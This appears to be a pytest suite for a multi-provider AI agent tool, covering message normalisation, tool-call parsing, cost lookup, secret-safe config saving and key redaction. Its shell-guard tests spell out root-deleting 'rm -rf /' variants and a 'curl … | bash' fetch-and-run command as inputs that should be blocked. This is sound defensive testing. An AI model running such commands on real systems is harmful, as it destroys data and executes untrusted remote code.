import asyncio
import json
import os
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import src.config as config
from src.core.provider import AIProvider, ProviderError, normalize_messages, split_system
from src.providers.anthropic import Provider as AnthropicProvider
from src.providers.base import OpenAIProvider as CompatProvider
from src.utils import ModelCatalog, redact_fast


class FakeResponse:
    def __init__(self, payload, status_code=200):
        self._payload = payload
        self.status_code = status_code
        self.text = ""

    def json(self):
        return self._payload


class FakeClient:
    def __init__(self, payload, status_code=200):
        self.payload = payload
        self.status_code = status_code

    async def post(self, *args, **kwargs):
        return FakeResponse(self.payload, self.status_code)


def _openai():
    return CompatProvider(
        name="openai",
        base_url="https://example.test/v1",
        headers={"Authorization": "Bearer test"},
        model="gpt-4o-mini",
    )


def _anthropic():
    from src.config import AnthropicSettings

    return AnthropicProvider(AnthropicSettings(api_key="test-key", model="claude-sonnet-4-5"))


def test_normalize_merges_same_role():
    messages = normalize_messages(
        [
            {"role": "user", "content": "go"},
            {"role": "assistant", "content": "one"},
            {"role": "assistant", "content": "two"},
            {"role": "user", "content": "three"},
        ]
    )
    assert [m["role"] for m in messages] == ["user", "assistant", "user"]
    assert messages[1]["content"] == "one\n\ntwo"


def test_normalize_hoists_system_and_keeps_user_first():
    messages = normalize_messages(
        [{"role": "assistant", "content": "stray"}, {"role": "user", "content": "hi"}],
        "system text",
    )
    assert messages[0] == {"role": "system", "content": "system text"}
    assert messages[1]["content"] == "Continue."


def test_normalize_drops_empty_content():
    messages = normalize_messages([{"role": "user", "content": "  "}, {"role": "user", "content": "ok"}])
    assert messages == [{"role": "user", "content": "ok"}]


def test_split_system_separates_prompt():
    system, rest = split_system(
        [{"role": "system", "content": "a"}, {"role": "system", "content": "b"},
         {"role": "user", "content": "hi"}]
    )
    assert system == "a\n\nb"
    assert rest == [{"role": "user", "content": "hi"}]


def test_anthropic_payload_alternates_even_with_double_assistant():
    provider = _anthropic()
    payload = provider._payload(
        [
            {"role": "user", "content": "hi"},
            {"role": "assistant", "content": "first"},
            {"role": "assistant", "content": "second"},
        ],
        "system prompt",
        False,
    )
    assert payload["system"] == "system prompt"
    assert [m["role"] for m in payload["messages"]] == ["user", "assistant"]
    assert "stream" in payload


def test_openai_payload_carries_system_message():
    payload = _openai()._payload([{"role": "user", "content": "hi"}], "sys", False)
    assert payload["messages"][0] == {"role": "system", "content": "sys"}


def test_error_body_raises_provider_error(monkeypatch):
    import src.providers.base as base_mod

    monkeypatch.setattr(base_mod, "get_http_client", lambda: FakeClient({"error": {"message": "bad key"}}))
    provider = _openai()
    try:
        asyncio.run(provider.generate_text([{"role": "user", "content": "hi"}], "sys"))
    except ProviderError as exc:
        assert "bad key" in str(exc)
    else:
        raise AssertionError("ProviderError was not raised")


def test_empty_content_raises(monkeypatch):
    import src.providers.base as base_mod

    monkeypatch.setattr(
        base_mod, "get_http_client",
        lambda: FakeClient({"choices": [{"message": {"content": ""}, "finish_reason": "stop"}]}),
    )
    provider = _openai()
    try:
        asyncio.run(provider.generate_text([{"role": "user", "content": "hi"}], "sys"))
    except ProviderError:
        pass
    else:
        raise AssertionError("ProviderError was not raised")


def test_usage_is_reset_per_call(monkeypatch):
    import src.providers.base as base_mod

    payload = {
        "choices": [{"message": {"content": "ok"}, "finish_reason": "stop"}],
        "usage": {"prompt_tokens": 10, "completion_tokens": 5},
    }
    monkeypatch.setattr(base_mod, "get_http_client", lambda: FakeClient(payload))
    provider = _openai()
    asyncio.run(provider.generate_text([{"role": "user", "content": "hi"}], "sys"))
    first = dict(provider._last_usage)
    monkeypatch.setattr(
        base_mod, "get_http_client",
        lambda: FakeClient({"choices": [{"message": {"content": "ok"}, "finish_reason": "stop"}]}),
    )
    asyncio.run(provider.generate_text([{"role": "user", "content": "hi"}], "sys"))
    assert first["prompt_tokens"] == 10
    assert provider._last_usage == {}
    assert provider._last_cost == 0.0


def test_stream_error_frame_raises():
    class StreamResponse:
        status_code = 200

        async def aiter_lines(self):
            yield 'data: {"error": {"message": "mid-stream failure"}}'

    class StreamContext:
        async def __aenter__(self):
            return StreamResponse()

        async def __aexit__(self, *args):
            return False

    class StreamClient:
        def stream(self, *args, **kwargs):
            return StreamContext()

        async def post(self, *args, **kwargs):
            raise AssertionError("stream error must not fall back to non-stream")

    import src.providers.base as base_mod

    original = base_mod.get_http_client
    base_mod.get_http_client = lambda: StreamClient()
    provider = _openai()
    try:
        asyncio.run(provider.generate_text([{"role": "user", "content": "hi"}], "sys", on_token=lambda t: None))
    except ProviderError as exc:
        assert "mid-stream failure" in str(exc)
    else:
        raise AssertionError("ProviderError was not raised")
    finally:
        base_mod.get_http_client = original


def test_openai_payload_carries_native_tools_and_parses_calls(monkeypatch):
    import src.providers.base as base_mod

    provider = _openai()
    provider.native_tools = [{"name": "read_file", "description": "read",
                              "parameters": {"type": "object", "properties": {"path": {"type": "string"}}}}]
    payload = provider._payload([{"role": "user", "content": "hi"}], "sys", False)
    assert payload["tools"] == [{"type": "function", "function": provider.native_tools[0]}]
    assert payload["tool_choice"] == "auto"

    reply = {"choices": [{"finish_reason": "tool_calls", "message": {
        "content": "", "tool_calls": [{"function": {"name": "read_file",
                                                    "arguments": '{"path": "src/cli.py"}'}}]}}]}
    monkeypatch.setattr(base_mod, "get_http_client", lambda: FakeClient(reply))
    text = asyncio.run(provider.generate_text([{"role": "user", "content": "hi"}], "sys"))
    assert text == ""
    assert provider.native_calls == [{"name": "read_file", "arguments": {"path": "src/cli.py"}}]


def test_anthropic_payload_carries_native_tools_and_parses_tool_use(monkeypatch):
    import src.providers.anthropic as anthropic_mod

    provider = _anthropic()
    provider.native_tools = [{"name": "read_file", "description": "read",
                              "parameters": {"type": "object", "properties": {"path": {"type": "string"}}}}]
    payload = provider._payload([{"role": "user", "content": "hi"}], "sys", False)
    assert payload["tools"][0]["input_schema"] == provider.native_tools[0]["parameters"]
    assert payload["tool_choice"] == {"type": "auto"}

    reply = {"type": "message", "content": [
        {"type": "tool_use", "name": "read_file", "input": {"path": "src/cli.py"}}]}
    monkeypatch.setattr(anthropic_mod, "get_http_client", lambda: FakeClient(reply))
    text = asyncio.run(provider.generate_text([{"role": "user", "content": "hi"}], "sys"))
    assert text == ""
    assert provider.native_calls == [{"name": "read_file", "arguments": {"path": "src/cli.py"}}]


def test_gemini_payload_carries_declarations_and_parses_function_call(monkeypatch):
    import src.providers.gemini as gemini_mod
    from src.config import GeminiSettings

    provider = gemini_mod.Provider(GeminiSettings(api_key="test-key", model="gemini-2.5-flash"))
    provider.native_tools = [{"name": "read_file", "description": "read",
                              "parameters": {"type": "object", "properties": {"path": {"type": "string"}}}}]
    payload = provider._payload([{"role": "user", "content": "hi"}], "sys", False)
    declaration = payload["tools"][0]["functionDeclarations"][0]
    assert declaration["name"] == "read_file"
    assert declaration["parameters"]["type"] == "OBJECT"

    reply = {"candidates": [{"content": {"parts": [
        {"functionCall": {"name": "read_file", "args": {"path": "src/cli.py"}}}]}}]}
    monkeypatch.setattr(gemini_mod, "get_http_client", lambda: FakeClient(reply))
    text = asyncio.run(provider.generate_text([{"role": "user", "content": "hi"}], "sys"))
    assert text == ""
    assert provider.native_calls == [{"name": "read_file", "arguments": {"path": "src/cli.py"}}]


def test_anthropic_stream_accumulates_tool_use(monkeypatch):
    import src.providers.anthropic as anthropic_mod

    frames = [
        {"type": "content_block_start", "index": 0,
         "content_block": {"type": "tool_use", "name": "read_file"}},
        {"type": "content_block_delta", "index": 0,
         "delta": {"type": "input_json_delta", "partial_json": '{"path": '}},
        {"type": "content_block_delta", "index": 0,
         "delta": {"type": "input_json_delta", "partial_json": '"src/cli.py"}'}},
    ]

    class StreamResponse:
        status_code = 200

        async def aiter_lines(self):
            for frame in frames:
                yield "data: " + __import__("json").dumps(frame)

    class StreamContext:
        async def __aenter__(self):
            return StreamResponse()

        async def __aexit__(self, *args):
            return False

    class StreamClient:
        def stream(self, *args, **kwargs):
            return StreamContext()

    monkeypatch.setattr(anthropic_mod, "get_http_client", lambda: StreamClient())
    provider = _anthropic()
    text = asyncio.run(provider.generate_text([{"role": "user", "content": "hi"}], "sys",
                                              on_token=lambda t: None))
    assert text == ""
    assert provider.native_calls == [{"name": "read_file", "arguments": {"path": "src/cli.py"}}]


def test_openai_stream_accumulates_tool_calls(monkeypatch):
    import json as _json

    import src.providers.base as base_mod

    frames = [
        {"choices": [{"delta": {"tool_calls": [{"index": 0, "function": {"name": "read_file", "arguments": '{"pa'}}]}}]},
        {"choices": [{"delta": {"tool_calls": [{"index": 0, "function": {"arguments": 'th": "AGENTS.md"}'}}]}}]},
    ]

    class StreamResponse:
        status_code = 200

        async def aiter_lines(self):
            for frame in frames:
                yield "data: " + _json.dumps(frame)
            yield "data: [DONE]"

    class StreamContext:
        async def __aenter__(self):
            return StreamResponse()

        async def __aexit__(self, *args):
            return False

    class StreamClient:
        def stream(self, *args, **kwargs):
            return StreamContext()

    monkeypatch.setattr(base_mod, "get_http_client", lambda: StreamClient())
    provider = _openai()
    text = asyncio.run(provider.generate_text([{"role": "user", "content": "hi"}], "sys",
                                              on_token=lambda t: None))
    assert text == ""
    assert provider.native_calls == [{"name": "read_file", "arguments": {"path": "AGENTS.md"}}]




CATALOG = {
    "openrouter": {
        "models": {
            "some/model": {
                "limit": {"context": 200_000},
                "cost": {"input": 1.5, "output": 6.0},
            },
            "unknown-model": {"limit": {"context": 32_000}},
        }
    },
    "google": {
        "models": {
            "gemini-test": {"limit": {"context": 1_000_000}, "cost": {"input": 0.1, "output": 0.4}},
        }
    },
}


def _catalog(monkeypatch):
    monkeypatch.setattr(ModelCatalog, "_fetch", classmethod(lambda cls, force=False: CATALOG))


def test_context_comes_from_catalog(monkeypatch):
    _catalog(monkeypatch)
    assert ModelCatalog.get_context("openrouter", "some/model") == 200_000


def test_gemini_maps_to_google_catalog(monkeypatch):
    _catalog(monkeypatch)
    assert ModelCatalog.get_context("gemini", "gemini-test") == 1_000_000


def test_rates_and_cost_are_external(monkeypatch):
    _catalog(monkeypatch)
    assert ModelCatalog.get_rates("openrouter", "some/model") == {"input": 1.5, "output": 6.0}
    cost = ModelCatalog.get_cost("openrouter", "some/model", 1_000_000, 1_000_000)
    assert cost == 7.5


def test_unknown_model_is_free(monkeypatch):
    _catalog(monkeypatch)
    assert ModelCatalog.get_rates("openrouter", "unknown-model") is None
    provider = AIProvider("https://example.test/v1", api_key="k", model="unknown-model")
    provider.name = "openrouter"
    assert provider._estimate_cost(10, 10) == 0.0
    provider._record_usage({"prompt_tokens": 10, "completion_tokens": 10})
    assert provider._last_cost == 0.0


def test_local_endpoint_is_free(monkeypatch):
    _catalog(monkeypatch)
    provider = AIProvider("http://localhost:11434/v1", api_key="k", model="some/model")
    provider.name = "openrouter"
    assert provider._estimate_cost(1000, 1000) == 0.0


def test_no_price_literals_in_source():
    pattern = re.compile(r"(\$\s*\d+\.\d+|\d+\.\d+\s*/\s*1e6|per\s*1m|usd\s*per)", re.IGNORECASE)
    offenders = []
    for path in Path("src").rglob("*.py"):
        for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            if pattern.search(line) and "rates" not in line:
                offenders.append(f"{path}:{number}: {line.strip()}")
    assert offenders == []


def test_clone_isolates_call_state():
    provider = _openai()
    provider._record_usage({"prompt_tokens": 10, "completion_tokens": 5})
    provider.native_tools.append({"name": "read_file"})
    twin = provider.clone()
    assert twin is not provider
    assert twin._last_usage == {}
    assert twin._last_cost == 0.0
    assert provider._last_usage["prompt_tokens"] == 10
    assert twin.native_tools == provider.native_tools
    twin.native_tools.append({"name": "shell"})
    assert len(provider.native_tools) == 1


def _isolate(monkeypatch, tmp_path):
    monkeypatch.setattr(config, "CONFIG_PATH", tmp_path / "config.json")
    monkeypatch.setattr(config, "ENV_PATH", tmp_path / ".env")
    monkeypatch.setattr(config, "_config_instance", None, raising=False)


def test_corrupt_config_is_left_intact(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    path = tmp_path / "config.json"
    path.write_text("{ broken json")
    settings = config.load_config()
    assert settings.max_steps == config.GlobalSettings().max_steps
    assert path.read_text() == "{ broken json"


def test_validation_failure_does_not_overwrite(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    path = tmp_path / "config.json"
    payload = json.dumps({"max_steps": "not-a-number"})
    path.write_text(payload)
    config.load_config()
    assert path.read_text() == payload


def test_save_omits_keys_and_mcp_env(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    settings = config.GlobalSettings()
    settings.openrouter.api_key = "sk-or-secret-value"
    settings.mcp_servers["demo"] = config.MCPServerConfig(
        command="python", args=["-m", "demo"], env={"DEMO_TOKEN": "secret"}
    )
    settings.save()
    written = json.loads((tmp_path / "config.json").read_text())
    assert "api_key" not in written["openrouter"]
    assert "env" not in written["mcp_servers"]["demo"]
    assert "sk-or-secret-value" not in (tmp_path / "config.json").read_text()


def test_save_is_atomic(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    config.GlobalSettings().save()
    assert (tmp_path / "config.json").exists()
    assert not (tmp_path / "config.json.tmp").exists()


def test_save_env_var_round_trips(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    monkeypatch.setenv("ZERVGEN_TEST_API_KEY", "")
    assert config.save_env_var("ZERVGEN_TEST_API_KEY", "value-1") is True
    assert config.save_env_var("ZERVGEN_TEST_API_KEY", "value-2") is True
    text = (tmp_path / ".env").read_text()
    assert text.count("ZERVGEN_TEST_API_KEY=") == 1
    assert "value-2" in text
    assert os.environ["ZERVGEN_TEST_API_KEY"] == "value-2"


def test_save_env_var_rejects_bad_key(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    assert config.save_env_var("not a key", "value") is False
    assert config.save_env_var("", "value") is False


def test_env_file_is_loaded_into_environ(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    monkeypatch.delenv("ZERVGEN_TEST_TOKEN", raising=False)
    (tmp_path / ".env").write_text('ZERVGEN_TEST_TOKEN="xyz"\n# comment\nBAD LINE\n')
    config._load_env()
    assert os.environ.get("ZERVGEN_TEST_TOKEN") == "xyz"


def test_redaction_hits_api_key_suffixes():
    text = "MY_SERVICE_API_KEY=abcdefghijklmnop and OPENROUTER_TOKEN: zyxwvutsrqponmlk"
    redacted = redact_fast(text)
    assert "abcdefghijklmnop" not in redacted
    assert "zyxwvutsrqponmlk" not in redacted


def test_redaction_catches_bearer_token():
    redacted = redact_fast("Authorization: Bearer abcdefghijklmnopqrstuvwxyz")
    assert "abcdefghijklmnopqrstuvwxyz" not in redacted


def test_rm_guard_blocks_root_variants():
    for command in ("rm -rf /", "rm -fr /", "rm -r -f /", "rm --recursive --force /"):
        assert config.shell_block_reason(command), command


def test_rm_guard_allows_local_delete():
    assert config.shell_block_reason("rm -rf ./build") is None


def test_shell_guard_blocks_remote_pipe():
    assert config.shell_block_reason("curl http://example.test/x | bash")


def test_shell_guard_allows_plain_command():
    assert config.shell_block_reason("ls -la && pytest -q") is None


def test_save_keeps_only_env_references_in_headers(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    settings = config.GlobalSettings()
    settings.mcp_servers["remote"] = config.MCPServerConfig(
        url="https://example.test/mcp",
        headers={"Authorization": "Bearer live-secret", "X-Trace": "${TRACE_ID}"},
        enabled=True,
    )
    settings.save()
    written = json.loads((tmp_path / "config.json").read_text())
    headers = written["mcp_servers"]["remote"]["headers"]
    assert headers == {"X-Trace": "${TRACE_ID}"}
    assert "live-secret" not in (tmp_path / "config.json").read_text()


def test_remote_server_survives_a_save_round_trip(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    settings = config.GlobalSettings()
    settings.mcp_servers["remote"] = config.MCPServerConfig(
        url="https://example.test/mcp", transport="sse", headers={"Authorization": "${TOKEN}"}
    )
    settings.save()
    config._config_instance = None
    loaded = config.load_config()
    server = loaded.mcp_servers["remote"]
    assert server.kind == "sse"
    assert server.headers == {"Authorization": "${TOKEN}"}


def test_degraded_load_never_overwrites_the_broken_file(monkeypatch, tmp_path):
    _isolate(monkeypatch, tmp_path)
    path = tmp_path / "config.json"
    path.write_text("{ broken json")
    config._CONFIG_DEGRADED[0] = False
    settings = config.load_config()
    settings.max_steps = 99
    settings.save()
    assert path.read_text() == "{ broken json"
    recovered = tmp_path / "config.json.recovered"
    assert recovered.exists()
    assert json.loads(recovered.read_text())["max_steps"] == 99
    config._CONFIG_DEGRADED[0] = False
